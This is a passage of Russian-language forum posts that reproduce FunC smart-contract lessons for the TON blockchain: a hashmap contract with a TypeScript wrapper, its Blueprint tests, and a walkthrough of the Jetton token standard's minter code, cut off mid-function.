Здесь все просто, оператор `return` нам в помощь. Итоговый код `op`\=2

```
if (op == 2) {
	int key = -1;
	do {
		(key, slice cs, int f) = dic.udict_get_next?(256, key);
		if (f) {
			int valid_until = cs~load_uint(64);
			if (valid_until < now()) {
				dic~udict_delete?(256, key);
			}
		}
	} until (~ f);

	if (dic.dict_empty?()) {
		set_data(begin_cell().end_cell());
	} else {
		set_data(dic);
	}

	return ();
}
```

## [](#get-17)Get функция

Метод `get_key` по ключу должен вернуть `valid_until` и слайс с данными по этому ключу. Соответственно по заданию нам надо:

*   взять данные из постоянных данных
*   найти данные по ключу
*   вернуть ошибку если данных нет
*   вычитать `valid_until`
*   вернуть данные

##### [](#h-18)Берем постоянные данные контракта

Для загрузки данных напишем отдельную функцию load\_data(), которая будет проверить есть ли данные и возвращать либо пустой словарь `new_dict()`, либо постоянные данные. Проверять будем с `slice_bits()` - которое возвращает количество битов данных в слайсе.

```
cell load_data() {
	cell data = get_data();
	slice ds = data.begin_parse();
	if (ds.slice_bits() == 0) {
		return new_dict();
	} else {
		return data;
	}
}
```

Теперь вызовем функцию в get методе.

```
(int, slice) get_key(int key) method_id {
	cell dic = load_data();

}
```

##### [](#h-19)Ищем данные по ключу

Для поиска данных по ключу возьмем функцию `udict_get?`

`udict_get?` - ищет индекс ключа в словаре dict В случае успеха возвращает значение, найденное в виде слайса, вместе с флагом -1, указывающим на успех. В случае неудачи возвращает (null, 0).

Получим:

```
(int, slice) get_key(int key) method_id {
	cell dic = load_data();
	(slice payload, int success) = dic.udict_get?(256, key);

}
```

##### [](#h-20)Возвращаем ошибку если данных нет

Функция `udict_get?` возвращает удобный флаг, который мы поместили в success.  
Используя `throw_unless` вернем исключение.

```
(int, slice) get_key(int key) method_id {
	cell dic = load_data();
	(slice payload, int success) = dic.udict_get?(256, key);
	throw_unless(98, success);

}
```

##### [](#valid_until-21)Вычитаем valid\_until и вернем данные

Здесь все просто, из переменной `payload` вычитаем `valid_until` и вернем обе переменные.

```
(int, slice) get_key(int key) method_id {
	cell dic = load_data();
	(slice payload, int success) = dic.udict_get?(256, key);
	throw_unless(98, success);

	int valid_until = payload~load_uint(64);
	return (valid_until, payload);
}
```

## [](#typescript-22)Обёртка на TypeScript

Для удобного взаимодействия с нашим смарт-контрактом, напишем обёртку на TypeScript. База для неё уже предоставляется от Blueprint.

### [](#h-23)Конфиг данных контракта

Откроем файл `wrappers/Hashmap.ts` (название файла может быть другим, смотря как вы создавали проект).  
Конфиг данных остаётся пустым, как и задумано.

```
export type HashmapConfig = {};

export function hashmapConfigToCell(config: HashmapConfig): Cell {
    return beginCell().endCell();
}
```

Теперь перейдём к классу `Hashmap` чтобы добавить методы для вызова нужных нам операций.

### [](#op-1-24)Метод для вызова op = 1

При вызове операции с кодом 1, в тело сообщения мы должны положить: op=1, query\_id, ключ, valid\_until и само значение. Назовём метод `sendSet`.

```
async sendSet(
    provider: ContractProvider,
    via: Sender,
    value: bigint,
    opts: {
        queryId: bigint;
        key: bigint;
        value: Slice;
        validUntil: bigint;
    }
) {
    await provider.internal(via, {
        value,
        sendMode: SendMode.PAY_GAS_SEPARATELY,
        body: beginCell()
            .storeUint(1, 32)
            .storeUint(opts.queryId, 64)
            .storeUint(opts.key, 256)
            .storeUint(opts.validUntil, 64)
            .storeSlice(opts.value)
            .endCell(),
    });
}
```

### [](#op-2-25)Метод для вызова op = 2

Эта операция не требует дополнительных данных кроме op=2 и query\_id. Назовём метод `sendClearOldValues`.

```
async sendClearOldValues(
    provider: ContractProvider,
    via: Sender,
    value: bigint,
    opts: {
        queryId: bigint;
    }
) {
    await provider.internal(via, {
        value,
        sendMode: SendMode.PAY_GAS_SEPARATELY,
        body: beginCell().storeUint(2, 32).storeUint(opts.queryId, 64).endCell(),
    });
}
```

### [](#get_key-26)Метод для вызова геттера get\_key

Этот метод будет немного сложнее чем тот, что мы уже писали в одном из первых уроков, потому что здесь должно возвращаться сразу два значения. Такой тип в TypeScript можно задать как массив `[bigint, Slice]`. А `Promise<>` нужен потому что функция асинхронная (ключевое слово `async` перед её названием).

Вызовем `provider.get` и стек результата положим в константу `result`. Затем оттуда мы можем читать полученные значения для возврата из функции. С первым значением всё просто - делаем `readBigNumber()` чтобы прочитать `bigint` (который в FunC был `int`). Но с вторым значением появляется проблема: в библиотеке не предусмотрен отдельный метод для считывания слайса (что-то вроде `readSlice()`). Поэтому придётся использовать `peek()` который считывает следующее значение, игнорируя его тип, и явно указать компилятору, что это `TupleItemSlice`, а затем получить из него само значение.

```
async getByKey(provider: ContractProvider, key: bigint): Promise<[bigint, Slice]> {
    const result = (await provider.get('get_key', [{ type: 'int', value: key }])).stack;
    return [result.readBigNumber(), (result.peek() as TupleItemSlice).cell.asSlice()];
}
```

## [](#h-27)Заключение

Хотел сказать отдельное спасибо, тем кто донатит для поддержки проекта, это очень мотивирует и помогает выпускать уроки быстрее. Если вы хотите помочь проекту(быстрее выпускать уроки, перевести это все на английский итд), внизу на [главной странице](https://github.com/romanovichim/TonFunClessons_ru), есть адреса для донатов.

[github.com](https://github.com/romanovichim/TonFunClessons_ru/blob/main/lessons/smartcontract/7lesson/seventhlesson.md)

#### [romanovichim/TonFunClessons\_ru/blob/main/lessons/smartcontract/7lesson/seventhlesson.md](https://github.com/romanovichim/TonFunClessons_ru/blob/main/lessons/smartcontract/7lesson/seventhlesson.md)

```
# Урок 7 Hashmap или Словарь

## Введение

В этом уроке мы напишем смарт-контракт, который умеет производить разные операции с Hashmap - словарем, в блокчейне TON на языке FunC, а протестируем его уже в следующем уроке.

## Требования

Для прохождения данного урока вам достаточно установить [Node.js](https://nodejs.org). Желательно устанавливать одну из последних версий, например 18.

А также уметь создавать/деплоить проект с помощью Blueprint. Научиться этому можно в [первом уроке](https://github.com/romanovichim/TonFunClessons_ru/blob/main/1lesson/firstlesson.md).

## Hashmap or dictionaries (словари)

Hashmap - это структура данных представленная деревом. Hashmap - отображает ключи, в значения произвольного типа, таким образом, чтобы был возможен быстрый поиск и модификация. В FunC hashmaps [представлены ячейкой](https://docs.ton.org/develop/func/stdlib/#dictionaries-primitives).

## Смарт-контракт

Задача смарт-контракта будет добавлять и удалять данные и key/value хранилища Hashmap в частности следующая функциональность\*\*:

```

This file has been truncated. [show original](https://github.com/romanovichim/TonFunClessons_ru/blob/main/lessons/smartcontract/7lesson/seventhlesson.md)

 

*   [Home](/)
*   [Categories](/categories)
*   [Guidelines](/guidelines)

Powered by [Discourse](https://www.discourse.org), best viewed with JavaScript enabled



## Topic: 464

[TON Research](/)

# [Пишем смарт-контракты на FunC - Урок 8 Тестируем HashMap хранилище](/t/func-8-hashmap/464)

[Русский](/c/ru/general/50)  [General](/c/ru/general/50) 

[func](https://tonresear.ch/tag/func), [learn](https://tonresear.ch/tag/learn)

    

[IvanKriptov](https://tonresear.ch/u/IvanKriptov)  February 21, 2024, 8:44pm  1

# [](#h-8-func-c-hashmap-1)Урок 8 Тесты на FunC для смарт-контракта c Hashmap

## [](#h-2)Введение

В этом уроке мы напишем тесты для смарт-контракта созданного в седьмом уроке в блокчейне TON и выполним их с помощью [Blueprint](https://github.com/ton-community/blueprint).

## [](#h-3)Требования

Для прохождения данного урока вам достаточно установить [Node.js](https://nodejs.org). Желательно устанавливать одну из последних версий, например 18.

А также пройти [седьмой урок](https://github.com/romanovichim/TonFunClessons_ru/blob/main/7lesson/seventhlesson.md).

## [](#beforeeach-4)Меняем `beforeEach` в тестах для упрощения

Откроем файл `tests/Hashmap.spec.ts` в котором будут находиться наши тесты и поменяем функцию `beforeEach`, которая выполняется перед каждым тестом.

Добавим в неё установку текущего времени (меняем значение `blockchain.now`). Помимо этого, после успешного деплоя контракта, сразу попробуем установить три тестовых значения в нашей хешмапе используя написанный ранее метод `sendSet`.

С этого момента, в начале каждого теста, время уже будет установлено на `500`, а также три значения будут уже записаны (или не записаны в случае если смарт-контракт работает некорректно).

Получаем примерно такую функцию:

```
beforeEach(async () => {
    blockchain = await Blockchain.create();

    blockchain.now = 500;

    deployer = await blockchain.treasury('deployer');

    hashmap = blockchain.openContract(
        Hashmap.createFromConfig(
            {
                manager: deployer.address,
            },
            code
        )
    );

    const deployResult = await hashmap.sendDeploy(
        deployer.getSender(),
        toNano('0.01')
    );

    expect(deployResult.transactions).toHaveTransaction({
        from: deployer.address,
        to: hashmap.address,
        deploy: true,
    });

    await hashmap.sendSet(deployer.getSender(), toNano('0.05'), {
        queryId: 123n,
        key: 1n,
        validUntil: 1000n,
        value: beginCell().storeUint(123, 16).endCell().asSlice(),
    });

    await hashmap.sendSet(deployer.getSender(), toNano('0.05'), {
        queryId: 123n,
        key: 2n,
        validUntil: 2000n,
        value: beginCell().storeUint(234, 16).endCell().asSlice(),
    });

    await hashmap.sendSet(deployer.getSender(), toNano('0.05'), {
        queryId: 123n,
        key: 3n,
        validUntil: 3000n,
        value: beginCell().storeUint(345, 16).endCell().asSlice(),
    });
});
```

## [](#h-5)Тестируем запись и получение значений

Помним, что запись значений уже произошла в `beforeEach`, поэтому здесь нам остаётся лишь проверить, что значения действительно записались корректно.

Для этого используем написанный нами метод `getByKey` и сравниваем оба значения `validUntil` и `value` с ожидаемыми значениями (теми, которые мы записали в контракт).

Замечу, что для сравнения специфичных для TON типов (например Address или Slice), существуют отдельные мэтчеры. В этом случае нам пригодился `toEqualSlice`, который в тесте сравнивает на равенство два слайса.

Повторим эту процедуру для всех трёх записанных значений и тест готов.

```
it('should store and retrieve values', async () => {
    let [validUntil, value] = await hashmap.getByKey(1n);
    expect(validUntil).toEqual(1000n);
    expect(value).toEqualSlice(
        beginCell().storeUint(123, 16).endCell().asSlice()
    );

    [validUntil, value] = await hashmap.getByKey(2n);
    expect(validUntil).toEqual(2000n);
    expect(value).toEqualSlice(
        beginCell().storeUint(234, 16).endCell().asSlice()
    );

    [validUntil, value] = await hashmap.getByKey(3n);
    expect(validUntil).toEqual(3000n);
    expect(value).toEqualSlice(
        beginCell().storeUint(345, 16).endCell().asSlice()
    );
});
```

## [](#h-6)Тестируем наличие ошибки при не существующем ключе

Гет-методы, как и external сообщения, при неуспешном выполнении выбрасывают ошибку в TypeScript программе. Поэтому здесь нам нужно проверить, что вызов `getByKey(123n)` завершится с ошибкой. Так как этот метод асинхронный (вызывается с `await`), этот самый `await` следует вставить перед `expect()`.

Наличие ошибки при вызове функции можно проверить через `.rejects.toThrow()`.

```
it('should throw on not found key', async () => {
    await expect(hashmap.getByKey(123n)).rejects.toThrow();
});
```

## [](#h-7)Тестируем очистку старых значений

В этом тесте нам пригодится возможность менять значение текущего времени `blockchain.now`.

Для начала, попробуем вызвать очистку значений, не меняя время. В таком случае, ключ `1` должен успешно найтись.

```
await hashmap.sendClearOldValues(deployer.getSender(), toNano('0.05'), {
    queryId: 123n,
});

let [validUntil, value] = await hashmap.getByKey(1n);
expect(validUntil).toEqual(1000n);
expect(value).toEqualSlice(beginCell().storeUint(123, 16).endCell().asSlice());
```

Далее, выставим время на 1001. Так как `validUntil` у первого ключа равен 1000, после очистки, этот ключ должен пропасть. При этом все оставшиеся ключи должны остаться в контракте и никак не поменяться.

```
blockchain.now = 1001;

await hashmap.sendClearOldValues(deployer.getSender(), toNano('0.05'), {
    queryId: 123n,
});

await expect(hashmap.getByKey(1n)).rejects.toThrow();

[validUntil, value] = await hashmap.getByKey(2n);
expect(validUntil).toEqual(2000n);
expect(value).toEqualSlice(beginCell().storeUint(234, 16).endCell().asSlice());

[validUntil, value] = await hashmap.getByKey(3n);
expect(validUntil).toEqual(3000n);
expect(value).toEqualSlice(beginCell().storeUint(345, 16).endCell().asSlice());
```

И наконец, выставим время на 3001, чтобы после очистки пропали все ключи. Проверять наличие первого ключа уже не имеет смысла, так как мы проверили это выше.

```
blockchain.now = 3001;

await hashmap.sendClearOldValues(deployer.getSender(), toNano('0.05'), {
    queryId: 123n,
});

await expect(hashmap.getByKey(2n)).rejects.toThrow();
await expect(hashmap.getByKey(3n)).rejects.toThrow();
```

Весь код этого теста:

```
it('should clear old values', async () => {
    await hashmap.sendClearOldValues(deployer.getSender(), toNano('0.05'), {
        queryId: 123n,
    });

    let [validUntil, value] = await hashmap.getByKey(1n);
    expect(validUntil).toEqual(1000n);
    expect(value).toEqualSlice(
        beginCell().storeUint(123, 16).endCell().asSlice()
    );

    blockchain.now = 1001;

    await hashmap.sendClearOldValues(deployer.getSender(), toNano('0.05'), {
        queryId: 123n,
    });

    await expect(hashmap.getByKey(1n)).rejects.toThrow();

    [validUntil, value] = await hashmap.getByKey(2n);
    expect(validUntil).toEqual(2000n);
    expect(value).toEqualSlice(
        beginCell().storeUint(234, 16).endCell().asSlice()
    );

    [validUntil, value] = await hashmap.getByKey(3n);
    expect(validUntil).toEqual(3000n);
    expect(value).toEqualSlice(
        beginCell().storeUint(345, 16).endCell().asSlice()
    );

    blockchain.now = 3001;

    await hashmap.sendClearOldValues(deployer.getSender(), toNano('0.05'), {
        queryId: 123n,
    });

    await expect(hashmap.getByKey(2n)).rejects.toThrow();
    await expect(hashmap.getByKey(3n)).rejects.toThrow();
});
```

## [](#h-8)Тестируем ошибку при ненайденном опкоде

Для этого воспользуемся методом `send` у `deployer` для отправки произвольного сообщения. Отправим, например, opcode = 123 и query\_id = 123.

Такая транзакция должна закончиться с `exitCode = 12`, как мы и прописывали в контракте. Подобные проверки мы уже умеем делать.

```
it('should throw on wrong opcode', async () => {
    const result = await deployer.send({
        to: hashmap.address,
        value: toNano('0.05'),
        body: beginCell().storeUint(123, 32).storeUint(123, 64).endCell(),
    });
    expect(result.transactions).toHaveTransaction({
        from: deployer.address,
        to: hashmap.address,
        exitCode: 12,
    });
});
```

## [](#h-9)Тестируем ошибку при некорректном запросе

Как мы помним, op = 2 в нашем контракте предусматривает ошибку при наличии лишних данных в body сообщения. Это обеспечивается вызовом `end_parse()`.

Для проверки этой ошибки, как и в прошлом тесте, воспользуемся методом `send` и отправим сообщение с опкодом = 2, но в конец тела добавим так же лишние данные.

Такая транзакция должна закончиться неуспешно, то есть в мэтчере `toHaveTransaction` добавим флаг `success: false`.

```
it('should throw on bad query', async () => {
    const result = await deployer.send({
        to: hashmap.address,
        value: toNano('0.05'),
        body: beginCell()
            .storeUint(2, 32)
            .storeUint(123, 64)
            .storeStringTail('This string should not be here!')
            .endCell(),
    });
    expect(result.transactions).toHaveTransaction({
        from: deployer.address,
        to: hashmap.address,
        success: false,
    });
});
```

## [](#h-10)Запускаем тесты

Запустим тесты командой `npx blueprint test` и мы должны увидеть следующее:

```
 PASS  tests/Hashmap.spec.ts
  Hashmap
    ✓ should store and retrieve values (173 ms)
    ✓ should throw on not found key (80 ms)
    ✓ should clear old values (95 ms)
    ✓ should throw on wrong opcode (73 ms)
    ✓ should throw on bad query (129 ms)
```

Если какие то тесты у вас не прошли, просмотрите код и текст этого урока ещё раз. Также сверьте свой код смарт-контракта с кодом из предыдущего урока.

## [](#h-11)Заключение

Хотел сказать отдельное спасибо, тем кто донатит для поддержки проекта, это очень мотивирует и помогает выпускать уроки быстрее. Если вы хотите помочь проекту(быстрее выпускать уроки, перевести это все на английский итд), внизу на [главной странице](https://github.com/romanovichim/TonFunClessons_ru), есть адреса для донатов.

[github.com](https://github.com/romanovichim/TonFunClessons_ru/blob/main/lessons/smartcontract/8lesson/eighthlesson.md)

#### [romanovichim/TonFunClessons\_ru/blob/main/lessons/smartcontract/8lesson/eighthlesson.md](https://github.com/romanovichim/TonFunClessons_ru/blob/main/lessons/smartcontract/8lesson/eighthlesson.md)

```
# Урок 8 Тесты на FunC для смарт-контракта c Hashmap

## Введение

В этом уроке мы напишем тесты для смарт-контракта созданного в седьмом уроке в блокчейне TON и выполним их с помощью [Blueprint](https://github.com/ton-community/blueprint).

## Требования

Для прохождения данного урока вам достаточно установить [Node.js](https://nodejs.org). Желательно устанавливать одну из последних версий, например 18.

А также пройти [седьмой урок](https://github.com/romanovichim/TonFunClessons_ru/blob/main/7lesson/seventhlesson.md).

## Меняем `beforeEach` в тестах для упрощения

Откроем файл `tests/Hashmap.spec.ts` в котором будут находиться наши тесты и поменяем функцию `beforeEach`, которая выполняется перед каждым тестом.

Добавим в неё установку текущего времени (меняем значение `blockchain.now`). Помимо этого, после успешного деплоя контракта, сразу попробуем установить три тестовых значения в нашей хешмапе используя написанный ранее метод `sendSet`.

С этого момента, в начале каждого теста, время уже будет установлено на `500`, а также три значения будут уже записаны (или не записаны в случае если смарт-контракт работает некорректно).

```

This file has been truncated. [show original](https://github.com/romanovichim/TonFunClessons_ru/blob/main/lessons/smartcontract/8lesson/eighthlesson.md)

 

*   [Home](/)
*   [Categories](/categories)
*   [Guidelines](/guidelines)

Powered by [Discourse](https://www.discourse.org), best viewed with JavaScript enabled



## Topic: 465

[TON Research](/)

# [Пишем смарт-контракты на FunC - Урок 9 Разбираем стандарт Jetton(Fungible Token)](/t/func-9-jetton-fungible-token/465)

[Русский](/c/ru/general/50)  [General](/c/ru/general/50) 

[func](https://tonresear.ch/tag/func), [learn](https://tonresear.ch/tag/learn)

    

[IvanKriptov](https://tonresear.ch/u/IvanKriptov)  February 21, 2024, 8:44pm  1

# [](#h-9-jetton-1)Урок 9 Стандарт Jetton

## [](#h-2)Предисловие - зачем нужны токены и стандарты

#### [](#h-3)Что такое токен

Токен - это единица учета некоторого цифрового актива в некоторой сети. Важно отметить, что под токеном обычно не подразумевают криптовалюту, а подразумевают запись, распределенную в блокчейне, которой управляют с помощью смарт-контрактов. В смарт-контракте записаны значения остатков на счетах держателей токенов, также смарт-контракт предоставляет возможность перевода токенов с одного счёта на другой.

#### [](#fungible-nonfungible-4)Что такое взаимозаменяемый(fungible) и невзаимозаменяемый(nonfungible) токен?

Одной из возможных классификаций токенов, является классификация по взаимозаменяемости.

**Взаимозаменяемые токены** — это активы, которые не уникальны и могут быть легко обменены на другой актив такого же типа. Такие токены сделаны таким образом, что каждый токен эквивалентен следующему токену.

**Невзаимозаменяемые токены** — это активы, каждый экземпляр которого уникален (специфичен) и не может быть замещён другим аналогичным активом. Невзаимозаменяемый токен представляет собой некоторый сертификат цифрового объекта с возможностью передавать сертификат через некоторый механизм.

#### [](#h-5)Зачем нужен стандарт токена и что это такое

Для того, чтобы токены можно было использовать в других приложениях (от кошельков до децентрализованных бирж) вводятся стандарты интерфейсов смарт-контрактов для токенов.

> В данном случае интерфейс — это сигнатура (синтаксическая конструкция объявления функции) функций без реализации самой функции.

#### [](#h-6)Где происходит “утверждение” стандарта

Обычно блокчейны имеют, отдельные страницы на гитхабе или на платформе с необходимыми механиками, куда можно вносить предложения по стандартам.

В TON это [репозиторий на гитхаб](https://github.com/ton-blockchain/TIPs).

> Важно, подобные страницы не являются форумом или местом свободного обсуждения блокчейна, поэтому ответственно отнеситесь к своим сообщениям, если хотите что-то предложить в данном репозитории.

#### [](#h-7)Какие риски возникают исходя из природы токена

Поскольку токены фактически являются смарт-контрактами, они, несмотря на всю свою эффективность, имеют определенные риски. Например, в коде смарт-контракта может быть баг, либо сам смарт-контракт написан таким образом, чтобы мошенники могли своровать средства держателей токенов. Поэтому желательно изучать смарт-контракты токенов.

## [](#jetton-ton-8)Что такое стандарт Jetton в TON

Стандартом взаимозаменяемого токена в TON является Jetton, описание стандарта [здесь](https://github.com/ton-blockchain/TIPs/issues/74). Токен стандарта Jetton должен состоять из двух видов смарт-контрактов:

*   мастер-контракта
*   контракт кошелек

Каждый Jetton имеет основной смарт-контракт (будем называть его мастер контракт), который используется для чеканки новых Jetton, учета общего предложения и предоставления общей информации о токене.

Информация о количестве жетонов, принадлежащих каждому пользователю, хранится в смарт-контрактах, называемых Jetton кошельком.

В документации стандарта есть хороший пример:

Если вы выпустите Jetton с предложением в 200 Jetton, которые принадлежат 3 людям, то вам необходимо развернуть 4 контракта: 1 Jetton-master и 3 jetton-кошелька.

#### [](#jetton-9)Функциональность контрактов в Jetton

Мастер-контракт по стандарту обязан реализовывать два Get-метода:

*   get\_jetton\_data() - возвращает:
    *   `total_supply` - (integer) - общее количество выпущенных токенов стандарта Jetton
    *   `mintable` - (-1/0) - флаг, указывающий, может ли количество жетонов увеличиваться
    *   `admin_address` - (MsgAddressInt) - адрес смарт-контракта, управляющего Jetton (мастер контракта)
    *   `jetton_content` - cell - данные в соответствии со [стандартом токена](https://github.com/ton-blockchain/TIPs/issues/64)
    *   `jetton_wallet_code` - cell - код кошелька для этого жетона
*   get\_wallet\_address(slice owner\_address) - возвращает адрес кошелька Jetton для этого адреса владельца.

Контракт-кошелек по стандарту должен реализовывать:

*   внутренние обработчики сообщений:
    *   передачи токенов
    *   сжигания токенов
*   Get метод `get_wallet_data()`, который возвращает:  
    `balance` - (uint256) количество токенов Jetton на кошельке.  
    `owner` - (MsgAddress) адрес владельца кошелька;  
    `jetton` - (MsgAddress) адрес мастер-адреса Jetton;  
    `jetton_wallet_code` - (cell) ячейка с кодом этого кошелька;

> Может возникнуть вопрос зачем нам код кошелька, код кошелька позволит воспроизвести адрес смарт-контракта кошелька, как это работает будет рассмотрено ниже.

> Важно: внутри стандарта также описывается много нюансов относительно комиссий, ограничения и прочего, но слишком подробно мы останавливаться на этом не будем, чтобы урок не превращался в книгу.

#### [](#h-10)Схема работы

Далее мы будем говорить про [пример](https://github.com/ton-blockchain/token-contract) реализации Jetton из стандарта. Конечно же это не единственная возможная реализация Jetton, но это позволит не разбирать все на уровне абстракций.

Для удобства разбора кода, проговорим, как работает Jetton функционально, т.е. как происходит передача токенов, чеканка и.т.д

В [примере](https://github.com/ton-blockchain/token-contract/tree/main/ft) есть следующие файлы:

*   два примера мастер контракта: jetton-minter.fc, jetton-minter-ICO.fc
*   контракт кошелек jetton-wallet.fc
*   остальные вспомогательные файлы.

Далее на примере мастер контракта jetton-minter.fc и контракта кошелька jetton-wallet.fc рассмотрим функциональность.

##### [](#h-11)Чеканка

Чеканка в jetton-minter.fc происходит следующим образом, владелец мастер контракта отправляет сообщение с `op::mint()`, где в теле сообщения передается информация на какой кошелек отправить токены стандарта Jetton. Далее сообщением происходит отправка информации на смарт-контракт кошелек.

##### [](#h-12)Сжигание монет

Владелец кошелька отправляет сообщение с `op::burn()` и смарт-контракт кошелька уменьшает количество токенов соответственно сообщению и отправляет нотификацию (`op::burn_notification()`) на мастер-контракт, что предложение токенов уменьшилось.

##### [](#transfer-sendreceive-13)Передача монет (Transfer - send/receive)

Передача токенов разделена на две части:

*   `op::transfer()` исходящий перевод
*   `op::internal_transfer()` входящий перевод

Исходящий перевод начинается с сообщения с `op::transfer()` от владельца смарт-контракта кошелька и происходит отправка токенов на другой смарт-контракт кошелек(и конечно же уменьшение своего баланса токенов).

Входящий перевод после сообщения с `op::internal_transfer()` изменяет баланс и отправляет сообщение c `op::transfer_notification()` - сообщение нотификация о произошедшей передаче.

И да, когда вы отправляете токены стандарта Jetton на какой-либо адрес, вы можете запросить, чтобы кошелек, связанный с этим адресом, уведомлял адрес о прибытии жетонов.

## [](#h-14)Разбираем код

Перед разбором кода отмечу, что в целом “механики” повторяются, поэтому чем дальше в разбор, тем более верхнеуровневый будет разбор.

Разбирать будем файлы из [репозитория](https://github.com/ton-blockchain/token-contract/tree/main/ft) будем в следующем порядке:

*   jetton-minter.fc
*   jetton-wallet.fc
*   jetton-minter-ICO.fc

А остальные файлы (jetton-utils.fc,op-codes.fc,params.fc) разберем параллельно с первыми тремя, так как они “служебные”.

## [](#jetton-minterfc-15)jetton-minter.fc

Мастер контракт начинается с двух вспомогательные функций, для загрузки и выгрузки данных.

##### [](#h-16)Загружаем и выгружаем постоянные данные

Теперь посмотрим на две вспомогательные функции, которые будут загружать и выгружать постоянные данные. В “хранилище мастер контракта” будет храниться:

*   total\_supply - общий “запас” токена
*   admin\_address - адрес смарт-контракта, управляющего Jetton
*   content - ячейка в соответствии со [стандартом](https://github.com/ton-blockchain/TIPs/issues/64)
*   jetton\_wallet\_code код кошелька для этого жетона

Для того чтобы “достать” постоянные данные нам понадобятся две функции из стандартной библиотеки FunC

А именно: `get_data` - берет ячейку из постоянных данных. `begin_parse` - ячейку преобразует в slice

```
	(int, slice, cell, cell) load_data() inline {
	  slice ds = get_data().begin_parse();
	  return (
		  ds~load_coins(), ;; total_supply
		  ds~load_msg_addr(), ;; admin_address
		  ds~load_ref(), ;; content
		  ds~load_ref()  ;; jetton_wallet_code
	  );
	}
```

C помощью уже знакомым нам `load_` функциям выгрузим данные из slice и вернем их.  
Для того чтобы сохранить данные, нам необходимо выполнить три действия:

*   создать Builder для будущей ячейки
*   записать в нее значение
*   из Builder создать Cell (ячейку)
*   Записать получившуюся ячейку в регистр

Делать это мы будем опять же с помощью [функций стандартной библиотеки FunC](https://docs.ton.org/develop/func/stdlib/).

`begin_cell()` - создаст Builder для будущей ячейки `end_cell()` - создать Cell (ячейку) `set_data()` - запишет ячейку в постоянные данные

```
() save_data(int total_supply, slice admin_address, cell content, cell jetton_wallet_code) impure inline {
  set_data(begin_cell()
			.store_coins(total_supply)
			.store_slice(admin_address)
			.store_ref(content)
			.store_ref(jetton_wallet_code)
		   .end_cell()
		  );
}
```

C помощью уже знакомым нам `store_` функциям будем хранить данные.

##### [](#h-17)Вспомогательная функция чеканки

Дальше по [коду](https://github.com/ton-blockchain/token-contract/blob/main/ft/jetton-minter.fc) идет вспомогательная функция чеканки токенов.

```
() mint_tokens(slice to_address, cell jetton_wallet_code, int amount, cell master_msg) impure {

}
```

Она принимает параметры:

*   slice to\_address - адрес на который надо будет отправить токены
*   cell jetton\_wallet\_code - код кошелька для этого жетона
*   int amount - количество токенов
*   cell master\_msg - сообщение от мастера контракта

И тут возникает следующий вопрос, у нас есть некоторый адрес, но это не адрес кошелька жетона, как же тогда получить адрес смарт-контракта кошелька с жетонами(токенами)?

Тут есть небольшой трюк. Если мы изучим [документацию](https://docs.ton.org/develop/howto/step-by-step#3-compiling-a-new-smart-contract), того как компилируется смарт-контракт.

Мы можем увидеть следующее:

Код и данные для нового смарт-контракта объединяются в структуру StateInit (в следующих строках), вычисляется и выводится адрес нового смарт-контракта (равный хешу этой структуры StateInit), а затем внешнее сообщение с создается адрес назначения, равный адресу нового смарт-контракта. Это внешнее сообщение содержит как правильный StateInit для нового смарт-контракта, так и нетривиальную полезную нагрузку (подписанную правильным закрытым ключом).

Для нас это значит, что мы можем получить адрес смарт-контракта токена по адресу на который надо отправить токены. Если говорить простыми словами мы соберем, используя адрес, код кошелька, соберем StateInit кошелька.

Подобное возможно, так как функции [хэширования](https://ru.wikipedia.org/wiki/%D0%A5%D0%B5%D1%88-%D1%84%D1%83%D0%BD%D0%BA%D1%86%D0%B8%D1%8F) детерминированы, это значит, что для разных входных данных будет разный хэш,  
при этом для одних и тех же входных данных хэш функция будет возвращать всегда единообразный хэш.

Для такого в файле jetton-utils.fc есть две функции `calculate_jetton_wallet_state_init` и `calculate_jetton_wallet_address`

```
 cell calculate_jetton_wallet_state_init(slice owner_address, slice jetton_master_address, cell jetton_wallet_code) inline {
  return begin_cell()
		  .store_uint(0, 2)
		  .store_dict(jetton_wallet_code)
		  .store_dict(pack_jetton_wallet_data(0, owner_address, jetton_master_address, jetton_wallet_code))
		  .store_uint(0, 1)
		 .end_cell();
}

slice calculate_jetton_wallet_address(cell state_init) inline {
  return begin_cell().store_uint(4, 3)
					 .store_int(workchain(), 8)
					 .store_uint(cell_hash(state_init), 256)
					 .end_cell()
					 .begin_parse();
}
```

Функция `calculate_jetton_wallet_state_init` cобирает StateInit в соответствии со [стандартом токенов](https://github.com/ton-blockchain/TIPs/issues/64) с нулевым балансом.

Функция `calculate_jetton_wallet_address` собирает адрес в соотвествии с [TL-B схемой](https://github.com/ton-blockchain/ton/blob/master/crypto/block/block.tlb#L99).

> для вычисления хэш используется функция`cell_hash()` - она вычисляет хэш представления ячейки.

Таким образом функция чеканки теперь выглядит так:

```
() mint_tokens(slice to_address, cell jetton_wallet_code, int amount, cell master_msg) impure {
  cell state_init = calculate_jetton_wallet_state_init(to_address, my_address(), jetton_wallet_code);
  slice to_wallet_address = calculate_jetton_wallet_address(state_init);

}
```

Дальше необходимо отправить сообщение в смарт-контракт:

```
  var msg = begin_cell()
	.store_uint(0x18, 6)
	.store_slice(to_wallet_address)
	.store_coins(amount)
	.store_uint(4 + 2 + 1, 1 + 4 + 4 + 64 + 32 + 1 + 1 + 1)
	.store_ref(state_init)
	.store_ref(master_msg);
```

Про отправку сообщений хорошо написано [здесь](https://docs.ton.org/develop/smart-contracts/messages), а также в третьем уроке. Используя `store_ref` передаем сообщение с информацией для контракта кошелька.

Осталось только отправить сообщение, для этого используется `send_raw_message` из [стандартной библиотеки](https://docs.ton.org/develop/func/stdlib/#send_raw_message).

Переменную msg мы уже собрали, остается разобраться `mode`. Описание каждого режиме есть в [документации](https://docs.ton.org/develop/func/stdlib/#send_raw_message). Мы же рассмотрим на примере, чтобы было понятнее.

Пускай на балансе смарт-контракта 100 монет, и мы получаем internal message c 60 монетами и отсылаем сообщение с 10, общий fee 3.

`mode = 0` - баланс (100+60-10 = 150 монет), отправим(10-3 = 7 монет)  
`mode = 1` - баланс (100+60-10-3 = 147 монет), отправим(10 монет)  
`mode = 64` - баланс (100-10 = 90 монет), отправим (60+10-3 = 67 монет)  
`mode = 65` - баланс (100-10-3=87 монет), отправим (60+10 = 70 монет)  
`mode = 128` -баланс (0 монет), отправим (100+60-3 = 157 монет)

В коде контракта у нас режим 1 это mode’ = mode + 1, что означает, что отправитель хочет оплатить комиссию за перевод отдельно

```
send_raw_message(msg.end_cell(), 1); ;; pay transfer fees separately, revert on errors
```

Итоговый код функции `mint_tokens()` :

```
() mint_tokens(slice to_address, cell jetton_wallet_code, int amount, cell master_msg) impure {
    cell state_init = calculate_jetton_wallet_state_init(to_address, my_address(), jetton_wallet_code);
